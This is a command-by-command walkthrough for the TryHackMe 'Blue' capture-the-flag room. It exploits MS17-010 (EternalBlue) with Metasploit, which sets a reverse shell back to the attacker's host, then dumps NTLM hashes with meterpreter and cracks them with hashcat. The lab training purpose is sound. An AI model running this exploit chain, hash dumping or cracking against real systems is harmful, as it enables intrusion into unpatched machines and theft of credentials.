#############################################
# 🔹 TryHackMe: Blue (MS17-010)
# Room: https://tryhackme.com/room/blue
# Video: https://youtu.be/-SyyNXYLvSQ
#############################################


#############################################
# 1️⃣ Initial Enumeration
#############################################

# Fast scanning with Rustscan + Nmap
rustscan -a 10.10.171.0 --ulimit 5000 -b 2000 -- -sC -sV -Pn -sS

# Verify MS17-010 vulnerability
nmap -p445 --script smb-vuln-ms17-010 10.10.171.0


#############################################
# 2️⃣ Exploitation with Metasploit
#############################################

# Start PostgreSQL for Metasploit
service postgresql start && msfconsole -q

# Search for the MS17-010 exploit
search ms17-010

# Use the EternalBlue exploit module (usually exploit/windows/smb/ms17_010_eternalblue)
use 0

# Set RHOSTS, LHOST, and LPORT
setg RHOSTS 10.10.171.0
setg LHOST <your_ip>
setg LPORT 4444

# Run the exploit
run

# (Optional: already NT/System) Upgrade to a meterpreter session
sessions -u 1
sessions -i 2


#############################################
# 3️⃣ Post-Exploitation: Credential Dumping
#############################################

# In meterpreter, dump password hashes
hashdump

# Save hashes to user.txt for cracking
# Crack NTLM hashes using Hashcat
hashcat -m 1000 -a 0 -o cracked.txt user.txt /usr/share/wordlists/rockyou.txt

# Show cracked credentials
hashcat -m 1000 user.txt --show


#############################################
# 4️⃣ Loot & Flags
#############################################

# Search for the second flag
search -f flag2.txt
